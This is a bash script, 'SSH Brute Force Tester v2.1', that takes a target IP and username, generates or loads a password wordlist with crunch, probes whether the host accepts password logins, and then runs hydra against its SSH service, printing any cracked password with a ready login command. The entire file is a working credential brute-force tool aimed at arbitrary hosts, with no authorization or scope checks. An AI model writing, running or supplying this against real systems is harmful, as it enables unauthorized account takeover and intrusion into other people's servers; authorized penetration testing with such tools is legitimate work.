#!/bin/bash
# SSH Brute Force Tester v2.1
# Usage: ./ssh-brute.sh <ip> <user> [wordlist] [port]

set -euo pipefail

IP="${1:?Usage: $0 <ip> <user> [wordlist] [port]}"
USER="${2:?Usage: $0 <ip> <user> [wordlist] [port]}"
WORDLIST="${3:-}"
PORT="${4:-22}"
LOG="/tmp/ssh-brute-$(date +%Y%m%d-%H%M%S).log"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log() { echo -e "$1" | tee -a "$LOG"; }

log "${YELLOW}=== SSH Brute Force Tester v2.1 ===${NC}"
log "Target: ${RED}$IP:$PORT${NC}"
log "User:   ${RED}$USER${NC}"
log "Log:    $LOG"
log ""

# === Wordlist selection ===
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILTIN_BIG="$SCRIPT_DIR/wordlist.txt"

if [ -n "$WORDLIST" ] && [ -f "$WORDLIST" ]; then
    log "${GREEN}[*] Custom wordlist: $WORDLIST${NC}"
elif [ -f "$BUILTIN_BIG" ]; then
    WORDLIST="$BUILTIN_BIG"
    log "${GREEN}[*] Using built-in wordlist ($BUILTIN_BIG)${NC}"
else
    log "${RED}[!] No wordlist found. Generate one:${NC}"
    log "${RED}    crunch 6 8 abcdefghijklmnopqrstuvwxyz1234567890 -o wordlist.txt${NC}"
    exit 1
fi

# === Check password auth ===
log "${YELLOW}[1/3] Checking password auth on port $PORT...${NC}"
SSH_OUTPUT=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
    -o PreferredAuthentications=none -p "$PORT" "$USER@$IP" 2>&1) || true

if echo "$SSH_OUTPUT" | grep -q "publickey"; then
    log "${RED}[!] Target only accepts SSH keys - brute force impossible${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Connection refused"; then
    log "${RED}[!] Connection refused on port $PORT${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Connection timed out"; then
    log "${RED}[!] Connection timed out on port $PORT${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "No route to host"; then
    log "${RED}[!] No route to host${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Network is unreachable"; then
    log "${RED}[!] Network unreachable${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Permission denied"; then
    log "${GREEN}[+] Password auth supported!${NC}"
else
    log "${YELLOW}[?] Unknown response, trying anyway...${NC}"
    log "${YELLOW}[?] SSH: $SSH_OUTPUT${NC}"
fi

# === Attack ===
COUNT=$(wc -l < "$WORDLIST" | tr -d ' ')
log "${YELLOW}[2/3] Wordlist: $COUNT passwords${NC}"
log "${YELLOW}[3/3] Starting brute force (timeout 300s)...${NC}"
log ""

# Progress counter
ATTEMPT=0

HYDRA_EXIT=0
timeout 300 hydra -l "$USER" -P "$WORDLIST" -t 4 -f -V -s "$PORT" "$IP" ssh 2>&1 | tee -a "$LOG" | while IFS= read -r line; do
    ATTEMPT=$((ATTEMPT + 1))

    if echo "$line" | grep -q "host:"; then
        log ""
        log "${GREEN}╔════════════════════════════════════════════╗${NC}"
        log "${GREEN}║  PASSWORD FOUND!                           ║${NC}"
        log "${GREEN}╚════════════════════════════════════════════╝${NC}"
        log "${GREEN}[FOUND] $line${NC}"
        log "${GREEN}[CMD]   ssh -p $PORT $USER@$IP${NC}"
    elif echo "$line" | grep -q "\[ATTEMPT\]"; then
        attempt=$(echo "$line" | sed -n 's/.*login: //p')
        printf "${CYAN}[*] [%d/%d] Trying: %s\033[K\r${NC}" "$ATTEMPT" "$COUNT" "$attempt"
    elif echo "$line" | grep -q "ERROR"; then
        log "${RED}[ERR] $line${NC}"
    fi
done || HYDRA_EXIT=$?

log ""
log ""

# === Results ===
if [ $HYDRA_EXIT -eq 124 ]; then
    log "${RED}[!] Timed out after 300 seconds${NC}"
elif [ $HYDRA_EXIT -eq 0 ]; then
    if grep -q "host:" "$LOG" 2>/dev/null; then
        FOUND=$(grep "host:" "$LOG")
        log "${GREEN}[+] Result: $FOUND${NC}"
        log "${GREEN}[+] SSH: ssh -p $PORT $USER@$IP${NC}"
    else
        log "${YELLOW}[-] No password found in wordlist ($COUNT tried)${NC}"
        log "${YELLOW}[-] Try bigger wordlist:${NC}"
        log "${YELLOW}    crunch 8 8 abcdefghijklmnopqrstuvwxyz1234567890 -o big.txt${NC}"
        log "${YELLOW}    ./ssh-brute.sh $IP $USER big.txt $PORT${NC}"
    fi
else
    log "${RED}[!] Hydra exited with code $HYDRA_EXIT${NC}"
fi

log "${YELLOW}=== Scan Complete ===${NC}"
log "Log: $LOG"
